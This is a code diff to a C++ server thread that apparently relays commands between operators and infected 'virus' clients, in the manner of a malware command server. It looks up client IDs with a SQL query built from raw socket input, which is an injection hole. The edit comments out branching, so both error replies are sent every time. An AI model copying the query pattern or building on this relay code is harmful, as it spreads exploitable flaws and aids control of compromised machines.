@@ -392,14 +392,13 @@ void* client_thread_function ( void *ptr ) {
 	memset(aes_key, 0, 32);
 
 	string data;
-	int rdc;
+	int rdc = 0;
 	while((rdc = secure_read(&sock)) != -1) {
 		data = string(sock.buf, rdc);
 
 		int result = mysql_query(mConnection,
 			("SELECT * FROM main.clients WHERE cid = '"+data+"'").c_str());
 		MYSQL_RES* res = mysql_store_result(mConnection);
-
 		if(mysql_num_rows(res) != 0) {
 			int i;
 			for(i = connections.size()-1; i >= 0; i--) {
@@ -416,7 +415,6 @@ void* client_thread_function ( void *ptr ) {
 
 					string client_data;
 					int res = 1;
-					int i = 0;
 					while(((rdc = secure_read(&sock)) != -1) && virus->sockfd) {
 						client_data = string(sock.buf, rdc);
 						client_data = "#500-CO: " + client_data;
@@ -484,18 +482,19 @@ void* client_thread_function ( void *ptr ) {
 				}
 			}
 			
-			if(i == -1) {
+			//if(i == -1) {
 				string client_data = "#520-ER: Virus not active";
 				secure_send(&sock, client_data.c_str(), client_data.size());
-			}
-
-		} else {
-			string sendback = "#580-ER: This Client was not found in the database.";	
-			secure_send(&sock, sendback.c_str(), sendback.size());
+			//}
 		}
+		//} else {
+			string sendback = "#580-ER: This Client was not found in the database.";	
+			//string sendback = "#520-ER: Virus not active. (cid nf)";
+			secure_send(&sock, sendback.c_str(), sendback.size());
+		
 		//if(secure_send(&sock, data.c_str(), data.size()) == -1) break;
 	}
-	
+	//cout << "After client not found in the database" << endl;
 }
 
 int update_client() 
